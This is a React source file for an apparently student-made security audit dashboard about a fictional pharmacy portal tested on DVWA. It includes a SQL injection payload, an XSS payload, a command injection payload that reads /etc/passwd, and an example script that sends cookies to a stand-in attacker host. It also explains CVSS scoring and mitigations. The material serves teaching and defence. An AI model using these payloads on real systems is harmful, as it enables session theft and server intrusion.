import React, { useState, useEffect } from 'react';
import './App.css';

// Importación de las imágenes
import comandosImg from './img_grocat/comandos_grocat.png';
import sqliImg from './img_grocat/sqli_grocat.png';
import xssImg from './img_grocat/xss_grocat.png';

export default function Matriz() {
  const [seccionActiva, setSeccionActiva] = useState('resumen');
  const [riesgoSeleccionado, setRiesgoSeleccionado] = useState(null);

  const riesgosData = {
      'R-01': { 
        id: 'R-01', 
        vuln: 'Inyección SQL (SQLi)', 
        amenaza: 'Filtración Masiva de Recetas y Datos: Un atacante extrae la base de datos completa de pacientes, exponiendo patologías y tratamientos.', 
        prob: 4, 
        imp: 5, 
        nivel: 'CRÍTICO (20)' 
      },
      'R-02': { 
        id: 'R-02', 
        vuln: 'Command Injection', 
        amenaza: 'Secuestro Total del Servidor: El atacante ejecuta comandos de sistema operativo, toma control del backend e instala malware o detiene los servicios de farmacia.', 
        prob: 3, 
        imp: 5, 
        nivel: 'CRÍTICO (15)' 
      },
      'R-03': { 
        id: 'R-03', 
        vuln: 'XSS Reflejado', 
        amenaza: 'Robo de Puntos y Sesiones: Robo de cookies de autenticación de clientes mediante enlaces maliciosos para realizar fraudes en el programa de fidelización.', 
        prob: 4, 
        imp: 3, 
        nivel: 'ALTO (12)' 
      }
    };
  
  const getThreatVisorClass = (nivel) => {
    if (!nivel) return '';
    if (nivel.includes('CRÍTICO')) return 'visor-critical';
    if (nivel.includes('ALTO')) return 'visor-high';
    if (nivel.includes('MEDIO')) return 'visor-medium';
    return '';
  };

  return (
    <div className="cod-dashboard">
      {/* HEADER TÁCTICO */}
      <header className="cod-header">
        <div className="cod-logo-area">
          <span className="cod-title-main">FARMASALUD</span>
          <span className="cod-title-sub">FUNDAMENTOS DE SEGURIDAD DE LA INFORMACIÓN // AUDITORIA_GROCAT</span>
        </div>

        <div className="cod-system-status">
          <span className="status-indicator online"></span> VULNERABILIDADES Y MATRIZ DE RIESGO: INACAP_2026
        </div>
      </header>


      <div className="cod-layout">
        {/* MENÚ DE SELECCIÓN LATERAL */}
        <aside className="cod-sidebar">
          <div className="sidebar-title">// SELECCIÓN DE MISIÓN</div>
          <nav className="cod-nav">
            <button className={`cod-nav-btn ${seccionActiva === 'resumen' ? 'active' : ''}`} onClick={() => setSeccionActiva('resumen')}>
              <span className="btn-id">01</span> RESUMEN
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'sqli' ? 'active' : ''}`} onClick={() => setSeccionActiva('sqli')}>
              <span className="btn-id">02</span> INYECCIÓN SQL (SQLi)
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'xss' ? 'active' : ''}`} onClick={() => setSeccionActiva('xss')}>
              <span className="btn-id">03</span> XSS REFLEJADO
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'comandos' ? 'active' : ''}`} onClick={() => setSeccionActiva('comandos')}>
              <span className="btn-id">04</span> INYECCIÓN DE COMANDOS
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'activos' ? 'active' : ''}`} onClick={() => setSeccionActiva('activos')}>
              <span className="btn-id">05</span> VALORACIÓN DE ACTIVOS
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'matriz_riesgo' ? 'active' : ''}`} onClick={() => setSeccionActiva('matriz_riesgo')}>
              <span className="btn-id">06</span> MATRIZ DE RIESGO
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'controles' ? 'active' : ''}`} onClick={() => setSeccionActiva('controles')}>
              <span className="btn-id">07</span> CONTROLES DE SEGURIDAD
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'recuperacion' ? 'active' : ''}`} onClick={() => setSeccionActiva('recuperacion')}>
              <span className="btn-id">08</span> PLAN DE RECUPERACIÓN
            </button>
            <button className={`cod-nav-btn ${seccionActiva === 'prompts' ? 'active' : ''}`} onClick={() => setSeccionActiva('prompts')}>
              <span className="btn-id">09</span> BITÁCORA DE IA & REPO
            </button>
          </nav>
        </aside>

        {/* ÁREA DE CONTENIDO */}
        <main className="cod-content-area">
          
          {/* 01 RESUMEN EJECUTIVO */}
          {seccionActiva === 'resumen' && (
            <div className="animate-fade">
              <h2 className="cyber-title">01 // RESUMEN</h2>
              
              <div className="cod-card">
                <h3>1. CONTEXTO DE LA EMPRESA AUDITADA</h3>
                <p>FarmaSalud es una cadena de farmacias a nivel nacional enfocada en la venta de medicamentos, gestión de recetas médicas y programas de fidelización de clientes. Al operar en el sector de la salud, la infraestructura tecnológica de FarmaSalud procesa, almacena y transmite Datos Personales Sensibles de pacientes (fichas médicas, tratamientos, diagnósticos implícitos en recetas) y Datos Financieros/Personales de consumo a través de su Portal de Clientes.</p>
              </div>

              <div className="cod-card">
                <h3>2. EL PORTAL DE CLIENTES Y ACTIVOS CRÍTICOS</h3>
                <p>El Portal de Clientes permite a los usuarios consultar y cargar recetas médicas digitales, revisar el historial de compras y puntos de fidelización, y gestionar métodos de pago y despacho a domicilio. Debido a la naturaleza de la información, el portal interactúa directamente con bases de datos críticas que contienen Registros de Salud Electrónicos y Datos de Tarjetas de Pago. La confidencialidad y la integridad de este sistema son vitales para la continuidad del negocio y el cumplimiento legal (Ley de Protección de la Vida Privada).</p>
              </div>

              <div className="cod-card">
                <h3>3. ALCANCE DE LA AUDITORÍA</h3>
                <p>Esta evaluación de seguridad consistió en un análisis técnico de vulnerabilidades ejecutado sobre el ambiente controlado de pruebas del portal (basado en la plataforma de entrenamiento DVWA) configurado en un nivel de seguridad "Low". El objetivo fundamental es identificar el impacto que tendrían fallos críticos de inyección y scripting en el ecosistema real de FarmaSalud.</p>
              </div>
            </div>
          )}

      {/* 02 SQLI */}
          {seccionActiva === 'sqli' && (
            <div className="animate-fade">
              <h2 className="cyber-title">02 // REPORTES TÉCNICOS: INYECCIÓN SQL</h2>
              
              <div className="cod-card border-high glow-border energy-pulse">
                <div className="cod-alert-tag high">AMENAZA CRÍTICA DETECTADA</div>
                <h3>1. EVIDENCIA DEL ATAQUE</h3>
                <p>El ataque se ejecutó explotando el formulario de consulta de ID del Portal de Clientes de FarmaSalud mediante la inyección de una compuerta lógica maliciosa.</p>
                <div className="cod-meta-list">
                  <div><strong>URL DE EXPLOTACIÓN:</strong> <span className="text-muted">https://dvwa-dnwe.onrender.com/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#</span></div>
                  <div><strong>PAYLOAD UTILIZADO:</strong> <code>' OR '1'='1</code></div>
                </div>
              </div>

            <div className="cod-card">
              <h3>3. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
              <p>
                El atacante ingresa <code>' OR '1'='1</code> en el campo de entrada. El servidor, al concatenar esta entrada directamente, genera la siguiente instrucción maliciosa:
              </p>

              <div className="cod-code-box">
                <code>SELECT nombre, apellido FROM usuarios WHERE id = '' OR '1'='1';</code>
              </div>

              <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
              <ul className="technical-list">
                <li><strong>La primera comilla (<code>'</code>):</strong> Cierra prematuramente el valor del campo <code>id</code> que el programador definió entre comillas simples en el código original.</li>
                <li><strong>El comando <code>OR</code>:</strong> Operador lógico que instruye a la base de datos a considerar válida la fila si la condición del <code>id</code> es correcta O si la condición siguiente es verdadera.</li>
                <li><strong>La condición <code>'1'='1'</code>:</strong> Una tautología (afirmación siempre verdadera). Al evaluarse como verdadera, la base de datos devuelve todos los registros de la tabla, ignorando la restricción original.</li>
              </ul>
            </div>

            <div className="cod-card">
              <h3>3. RESUMEN DEL PERFIL DE RIESGO Y SEVERIDAD</h3>
              <p>Cada letra representa una métrica que define la facilidad y el impacto del ataque:</p>
              
              <div className="table-responsive">
                <table className="cod-table">
                  <thead>
                    <tr>
                      <th>Métrica</th>
                      <th>Descripción Técnica</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr><td><strong>AV:N</strong></td><td><strong>(Attack Vector - Network):</strong> El ataque es remoto (a través de la red). No requiere acceso físico ni local al servidor.</td></tr>
                    <tr><td><strong>AC:L</strong></td><td><strong>(Attack Complexity - Low):</strong> La complejidad es baja. No se requieren condiciones especiales; el atacante puede repetir el ataque fácilmente.</td></tr>
                    <tr><td><strong>PR:N</strong></td><td><strong>(Privileges Required - None):</strong> No se requieren privilegios. El atacante no necesita ser usuario registrado ni administrador.</td></tr>
                    <tr><td><strong>UI:N</strong></td><td><strong>(User Interaction - None):</strong> No se requiere interacción del usuario. El ataque ocurre de forma autónoma.</td></tr>
                    <tr><td><strong>S:U</strong></td><td><strong>(Scope - Unchanged):</strong> El impacto no se propaga a otros componentes; el daño se limita al componente vulnerable.</td></tr>
                    <tr><td><strong>C:H</strong></td><td><strong>(Confidentiality - High):</strong> El impacto en la confidencialidad es alto. Acceso total a datos sensibles (fichas clínicas).</td></tr>
                    <tr><td><strong>I:N</strong></td><td><strong>(Integrity - None):</strong> El impacto en la integridad es nulo. El atacante no puede modificar los datos.</td></tr>
                    <tr><td><strong>A:N</strong></td><td><strong>(Availability - None):</strong> El impacto en la disponibilidad es nulo. El ataque no causa la caída del sistema.</td></tr>
                  </tbody>
                </table>
              </div>

              <p style={{ marginTop: '15px', fontFamily: 'monospace' }}>
                <strong>VECTOR:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
              </p>

              <div className="severity-banner text-high">PUNTAJE BASE: 7.5 [ALTA]</div>
            </div>

            <div className="cod-card">
              <h3>4. ANÁLISIS DE IMPACTO: INYECCIÓN SQL (SQLi)</h3>
              <p>
                <strong>EXFILTRACIÓN DE DATOS SENSIBLES:</strong> Es el impacto principal. Al manipular la consulta SELECT original, el atacante puede extraer registros de la base de datos sin restricciones de seguridad.
                <br/><br/>
                <strong>Activos afectados:</strong> Registros de Salud Electrónicos (EHR), datos personales (RUT, historial clínico) y datos financieros de los pacientes.
                <br/><br/>
                <strong>Riesgo:</strong> Violación de la Ley 19.628 de Protección de la Vida Privada. La exfiltración de esta información sensible es el impacto más grave, ya que compromete la privacidad del paciente y genera responsabilidad legal para FarmaSalud.
              </p>
            </div>

              {/* PUNTO 5: EVIDENCIA VISUAL */}
              <div className="cod-card">
                <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
                <img src={sqliImg} alt="SQLi Report" className="cod-intel-report" />
                <span className="cod-intel-caption">// AD-02_SQL_EXFILTRATION_LOG.PNG</span>
                <p>Captura de la ejecución del payload de inyección SQL en el portal.</p>
              </div>
            </div>
          )}

      {/* 03 XSS */}
{seccionActiva === 'xss' && (
  <div className="animate-fade">
    <h2 className="cyber-title">03 // REPORTES TÉCNICOS: CROSS-SITE SCRIPTING REFLEJADO</h2>

    <div className="cod-card">
      <div className="cod-alert-tag medium">AMENAZA DE RIESGO MODERADO</div>
      <h3>1. EVIDENCIA DEL ATAQUE</h3>
      <p>El ataque se ejecutó inyectando código de JavaScript malicioso en el campo de entrada del formulario de saludo del portal de clientes.</p>
      <div className="cod-meta-list">
        <div><strong>PAYLOAD UTILIZADO:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></div>
      </div>
    </div>

    <div className="cod-card">
      <h3>2. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
      <p>El atacante inyecta el script malicioso <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en un campo de entrada. La aplicación, al no realizar <strong>Output Encoding</strong>, inserta este código directamente en el HTML de la respuesta.</p>
      <div className="cod-code-box">
        <code>&lt;div&gt;Hola, &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code>
      </div>
      <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
      <ul className="technical-list">
        <li><strong>Etiqueta de Script:</strong> Al detectar <code>&lt;script&gt;</code>, el navegador de la víctima no lo trata como texto plano, sino como una instrucción ejecutable de JavaScript.</li>
        <li><strong>Ejecución en el Cliente:</strong> El navegador interpreta el comando <code>alert('XSS')</code>, desplegando una ventana emergente. En un escenario real, esto podría ser un script que robe cookies de sesión o redirija al usuario.</li>
        <li><strong>Falta de Sanitización:</strong> La vulnerabilidad reside en que el servidor web confía ciegamente en el input del usuario, permitiendo que caracteres especiales como <code>&lt;</code> y <code>&gt;</code> se rendericen como parte del código fuente de la página.</li>
      </ul>
    </div>

    <div className="cod-card">
      <h3>3. RESUMEN DEL PERFIL DE RIESGO: XSS REFLEJADO</h3>
      <div style={{ overflowX: 'auto' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
          <colgroup>
            <col style={{ width: '20%' }} />
            <col style={{ width: '80%' }} />
          </colgroup>
          <thead>
            <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
              <th style={{ padding: '10px', textAlign: 'left' }}>MÉTRICA</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>DESCRIPCIÓN TÉCNICA (XSS)</th>
            </tr>
          </thead>
          <tbody>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>AV : N</strong></td>
              <td style={{ padding: '10px' }}>(Attack Vector - Network): El ataque es remoto, ejecutado a través del navegador de la víctima.</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
              <td style={{ padding: '10px' }}><strong>AC : L</strong></td>
              <td style={{ padding: '10px' }}>(Attack Complexity - Low): No se requieren condiciones especiales; basta con enviar un enlace malicioso.</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>PR : N</strong></td>
              <td style={{ padding: '10px' }}>(Privileges Required - None): El atacante no necesita autenticarse en el sistema.</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
              <td style={{ padding: '10px' }}><strong>UI : R</strong></td>
              <td style={{ padding: '10px' }}>(User Interaction - Required): El ataque requiere que la víctima haga clic en un enlace o cargue la página.</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>S : C</strong></td>
              <td style={{ padding: '10px' }}>(Scope - Changed): El impacto se propaga al contexto del navegador del usuario.</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
              <td style={{ padding: '10px' }}><strong>C : L</strong></td>
              <td style={{ padding: '10px' }}>(Confidentiality - Low): Posible robo de cookies de sesión o información visible en pantalla.</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>I : L</strong></td>
              <td style={{ padding: '10px' }}>(Integrity - Low): Posibilidad de modificar la apariencia de la página o realizar acciones.</td>
            </tr>
            <tr>
              <td style={{ padding: '10px' }}><strong>A : N</strong></td>
              <td style={{ padding: '10px' }}>(Availability - None): El ataque no afecta la disponibilidad del servidor.</td>
            </tr>
          </tbody>
        </table>
      </div>
      <p style={{ marginTop: '15px', fontFamily: 'monospace' }}>
        <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>
      </p>
      <div className="severity-banner text-medium" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ffcc00' }}>
        PUNTAJE BASE: 6.1 [MEDIA]
      </div>
    </div>

    <div className="cod-card">
      <h3>4. ANÁLISIS DE IMPACTO: XSS REFLEJADO</h3>
      <p>
        <strong>COMPROMISO DE LA SESIÓN DEL PACIENTE:</strong> Es el impacto principal. Al inyectar un script malicioso en la URL o campos de entrada, el atacante puede ejecutar código en el navegador del usuario legítimo.
        <br/><br/>
        <strong>Activos afectados:</strong> Cookies de sesión, tokens de autenticación, información visual del portal (datos de recetas) y credenciales almacenadas en el navegador.
        <br/><br/>
        <strong>Riesgo:</strong> Suplantación de identidad (Account Takeover). Un atacante puede robar la sesión activa del paciente y realizar compras o visualizar historiales médicos a su nombre.
        <br/><br/>
        <strong>Medida de mitigación:</strong> Codificación de salida (Output Encoding) y políticas de seguridad de contenido (CSP).
      </p>
      <div className="cod-code-box">
        <code>{'// Ejemplo de ejecución en el cliente\n<script>fetch("https://atacker.com/steal?cookie=" + document.cookie);</script>'}</code>
      </div>
    </div>

    <div className="cod-card">
      <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
      {xssImg ? (
        <img src={xssImg} alt="XSS Report" className="cod-intel-report" />
      ) : (
        <p>Imagen no cargada</p>
      )}
      <span className="cod-intel-caption">// AS-01_XSS_TRACE.PNG</span>
    </div>

  </div>
)}

  {/* 04 COMANDOS */}
          {seccionActiva === 'comandos' && (
            <div className="animate-fade">
              <h2 className="cyber-title">04 // REPORTES TÉCNICOS: INYECCIÓN DE COMANDOS</h2>
              
              <div className="cod-card border-high glow-border energy-pulse">
                <div className="cod-alert-tag high">AMENAZA CRÍTICA DETECTADA</div>
                <h3>1. EVIDENCIA DEL ATAQUE</h3>
                <p>El ataque se realizó aprovechando un formulario de diagnóstico de red (herramienta de ping) integrado en el portal administrativo.</p>
                <div className="cod-meta-list">
                  <div><strong>PAYLOAD UTILIZADO:</strong> <code>127.0.0.1; cat /etc/passwd</code></div>
                </div>
              </div>

              <div className="cod-card">
                <h3>2. ANÁLISIS TÉCNICO (POR QUÉ FUNCIONA)</h3>
                <p>El aplicativo web llama internamente a una función de la shell (como <code>system()</code>) concatenando la entrada. Al utilizar el punto y coma <code>;</code> en Linux, el sistema operativo interpreta la línea de código como dos instrucciones independientes, ejecutando el comando de ping y acto seguido la lectura del archivo de usuarios y contraseñas (<code>/etc/passwd</code>) de manera no autorizada.</p>
              </div>

            <div className="cod-card">
              <h3>3. RESUMEN DEL PERFIL DE RIESGO: INYECCIÓN DE COMANDOS</h3>
              
              <div className="table-responsive">
                <table className="cod-table">
                  <thead style={{ backgroundColor: '#222', color: '#fff' }}>
                    <tr>
                      <th>MÉTRICA</th>
                      <th>DESCRIPCIÓN TÉCNICA (CMD INJECTION)</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr><td><strong>AV : N</strong></td><td>(Attack Vector - Network): Ataque remoto sin necesidad de acceso físico.</td></tr>
                    <tr><td><strong>AC : L</strong></td><td>(Attack Complexity - Low): Ejecución inmediata mediante comandos estándar.</td></tr>
                    <tr><td><strong>PR : N</strong></td><td>(Privileges Required - None): No requiere autenticación.</td></tr>
                    <tr><td><strong>UI : N</strong></td><td>(User Interaction - None): El ataque ocurre de forma autónoma.</td></tr>
                    <tr><td><strong>S : U</strong></td><td>(Scope - Unchanged): El impacto se mantiene dentro del servidor comprometido.</td></tr>
                    <tr><td><strong>C : H</strong></td><td>(Confidentiality - High): Acceso total a archivos del servidor.</td></tr>
                    <tr><td><strong>I : H</strong></td><td>(Integrity - High): Control total para modificar o borrar archivos.</td></tr>
                    <tr><td><strong>A : H</strong></td><td>(Availability - High): Capacidad de detener o destruir la infraestructura.</td></tr>
                  </tbody>
                </table>
              </div>

              <div style={{ marginTop: '20px', textAlign: 'center' }}>
                <p style={{ fontFamily: 'monospace' }}>
                  <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>
                </p>
                <div className="severity-banner text-critical" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ff0000', backgroundColor: '#ffeef0' }}>
                  PUNTAJE BASE: 9.8 [CRÍTICA]
                </div>
              </div>
            </div>

              {/* PUNTO 5: EVIDENCIA GRÁFICA */}
              <div className="cod-card">
                <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
                <img src={comandosImg} alt="Command Injection Report" className="cod-intel-report" />
                <span className="cod-intel-caption">// AI-01_SHELL_EXEC_LOG.PNG</span>
                <p>Captura de la ejecución del comando para leer archivos sensibles del sistema.</p>
              </div>
            </div>
          )}

          {/* 05 VALORACIÓN DE ACTIVOS */}
          {seccionActiva === 'activos' && (
            <div className="animate-fade">
              <h2 className="cyber-title">05 // INVENTARIO Y VALORACIÓN DE ACTIVOS CRÍTICOS</h2>
              
              <div className="cod-card">
                <h3>1. IDENTIFICACIÓN DE ACTIVOS</h3>
                <div className="cod-tactical-list">
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AD-01 Base de Datos (EHR):</strong> Fichas médicas e historial clínico de pacientes.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AD-02 Base de Datos de Clientes:</strong> Identidades, RUT, hashes de contraseñas y correos.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AD-03 Datos de Tarjetas (PCI):</strong> Transacciones financieras y pasarela de pago.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AS-01 Portal de Clientes:</strong> Aplicación web frontend/backend principal de la empresa.</div>
                  <div className="list-item"><span className="bullet">[▲]</span> <strong>AI-01 Servidor de Aplicaciones:</strong> Entorno Docker que aloja la API y backend.</div>
                </div>
              </div>

              <div className="cod-card">
                <h3>2. MATRIZ DE VALORACIÓN CRÍTICA</h3>
                <div style={{ overflowX: 'auto' }}>
                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
                    <colgroup>
                      <col style={{ width: '8%' }} />
                      <col style={{ width: '20%' }} />
                      <col style={{ width: '14%' }} />
                      <col style={{ width: '14%' }} />
                      <col style={{ width: '14%' }} />
                      <col style={{ width: '30%' }} />
                    </colgroup>
                    <thead>
                      <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
                        <th style={{ padding: '10px', textAlign: 'left' }}>ID</th>
                        <th style={{ padding: '10px', textAlign: 'left' }}>NOMBRE DEL ACTIVO</th>
                        <th style={{ padding: '10px', textAlign: 'left' }}>CONFIDENCIALIDAD</th>
                        <th style={{ padding: '10px', textAlign: 'left' }}>INTEGRIDAD</th>
                        <th style={{ padding: '10px', textAlign: 'left' }}>DISPONIBILIDAD</th>
                        <th style={{ padding: '10px', textAlign: 'left' }}>JUSTIFICACIÓN LEGAL / OPERATIVA</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
                        <td style={{ padding: '10px' }}><strong>AD-01</strong></td>
                        <td style={{ padding: '10px' }}>Base de Datos de Salud (EHR)</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px' }}>Ley de Protección de la Vida Privada (Datos Sensibles).</td>
                      </tr>
                      <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
                        <td style={{ padding: '10px' }}><strong>AD-02</strong></td>
                        <td style={{ padding: '10px' }}>Base de Datos de Clientes</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
                        <td style={{ padding: '10px' }}>Datos personales. Alto riesgo de phishing corporativo si se filtra.</td>
                      </tr>
                      <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
                        <td style={{ padding: '10px' }}><strong>AD-03</strong></td>
                        <td style={{ padding: '10px' }}>Datos de Tarjetas de Pago</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
                        <td style={{ padding: '10px' }}>Regulado por estándares internacionales obligatorios PCI-DSS.</td>
                      </tr>
                      <tr>
                        <td style={{ padding: '10px' }}><strong>AS-01</strong></td>
                        <td style={{ padding: '10px' }}>Portal de Clientes</td>
                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
                        <td style={{ padding: '10px' }}>Canal de venta digital principal. Su caída paraliza la operación.</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* 06 MATRIZ DE RIESGO */}
          {seccionActiva === 'matriz_riesgo' && (
            <div className="animate-fade">
              <h2 className="cyber-title">06 // MATRIZ DE RIESGO DE CIBERSEGURIDAD</h2>
              
              <div className="cod-card">
                <h3>1. MAPA DE CALOR OPERATIVO (PROBABILIDAD X IMPACTO)</h3>
                <p className="instruction-text">Selecciona un código de threat en el radar interactivo para inspeccionar sus parámetros de intelligence:</p>
                
                <div className="cod-grid-container">
                  <div className="cod-matrix-heat">
                    <div className="matrix-grid">
                      {[5, 4, 3, 2, 1].map((impacto) => (
                        <div key={impacto} className="matrix-row">
                          <span className="axis-label-y">{impacto}</span>
                          {[1, 2, 3, 4, 5].map((probabilidad) => {
                            let celdaClase = "cell-normal";
                            let textoCelda = "";
                            let idRiesgo = null;

                            if (probabilidad === 4 && impacto === 5) { celdaClase = "cell-critica"; textoCelda = "R-01"; idRiesgo = "R-01"; }
                            if (probabilidad === 3 && impacto === 5) { celdaClase = "cell-critica"; textoCelda = "R-02"; idRiesgo = "R-02"; }
                            if (probabilidad === 4 && impacto === 3) { celdaClase = "cell-alta"; textoCelda = "R-03"; idRiesgo = "R-03"; }

                            return (
                              <button 
                                key={probabilidad} 
                                className={`matrix-cell ${celdaClase} ${riesgoSeleccionado === idRiesgo && idRiesgo ? 'selected-cell' : ''}`}
                                onClick={() => idRiesgo && setRiesgoSeleccionado(idRiesgo)}
                                disabled={!idRiesgo}
                              >
                                {textoCelda}
                              </button>
                            );
                          })}
                        </div>
                      ))}
                      <div className="matrix-row axis-x-row">
                        <span></span>
                        {[1, 2, 3, 4, 5].map((p) => <span key={p} className="axis-label-x">{p}</span>)}
                      </div>
                    </div>
                  </div>

                  <div className={`cod-threat-visor ${getThreatVisorClass(riesgoSeleccionado ? riesgosData[riesgoSeleccionado].nivel : '')}`}>
                    <div className="visor-header">// INTELIGENCIA DE AMENAZAS</div>
                    {riesgoSeleccionado ? (
                      <div className="visor-body animate-fade">
                        <div className="visor-row"><strong>AMENAZA:</strong> <span className="highlight-orange">{riesgosData[riesgoSeleccionado].id}</span></div>
                        <div className="visor-row"><strong>VULNERABILIDAD:</strong> {riesgosData[riesgoSeleccionado].vuln}</div>
                        <div className="visor-row"><strong>DAÑO ESTIMADO:</strong> {riesgosData[riesgoSeleccionado].amenaza}</div>
                        <div className="visor-row"><strong>VALOR RIESGO:</strong> {riesgosData[riesgoSeleccionado].nivel}</div>
                      </div>
                    ) : (
                      <div className="visor-placeholder">RADAR EN ESPERA: SELECCIONE UN CÓDIGO R-XX EN LA MATRIZ</div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* 07 CUADRO DE CONTROLES */}
          {seccionActiva === 'controles' && (
  <div className="animate-fade">
    <h2 className="cyber-title">07 // CONTROLES DE SEGURIDAD</h2>
    
    <div className="cod-card">
      <h3>MATRIZ DE IMPLEMENTACIÓN (DEFENSA EN PROFUNDIDAD)</h3>
      <div style={{ overflowX: 'auto' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
          <colgroup>
            <col style={{ width: '12%' }} />
            <col style={{ width: '12%' }} />
            <col style={{ width: '38%' }} />
            <col style={{ width: '16%' }} />
            <col style={{ width: '22%' }} />
          </colgroup>
          <thead>
            <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
              <th style={{ padding: '10px', textAlign: 'left' }}>ID CONTROL</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>TIPO</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>DESCRIPCIÓN TÉCNICA</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>ESTADO OPERATIVO</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>VULNERABILIDAD ASOCIADA</th>
            </tr>
          </thead>
          <tbody>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>CTRL-01</strong></td>
              <td style={{ padding: '10px' }}>Preventivo</td>
              <td style={{ padding: '10px' }}>Implementación de <strong>Consultas Parametrizadas (Prepared Statements)</strong> en todo el backend.</td>
              <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>PENDIENTE</td>
              <td style={{ padding: '10px' }}>Inyección SQL (SQLi)</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
              <td style={{ padding: '10px' }}><strong>CTRL-02</strong></td>
              <td style={{ padding: '10px' }}>Preventivo</td>
              <td style={{ padding: '10px' }}>Activación de codificación de salida adaptativa al contexto (<strong>Output Encoding</strong>) en vistas.</td>
              <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>PENDIENTE</td>
              <td style={{ padding: '10px' }}>XSS Reflejado</td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>CTRL-03</strong></td>
              <td style={{ padding: '10px' }}>Preventivo</td>
              <td style={{ padding: '10px' }}>Prohibición absoluta de funciones de shell (<code>system()</code>), usando APIs de red nativas.</td>
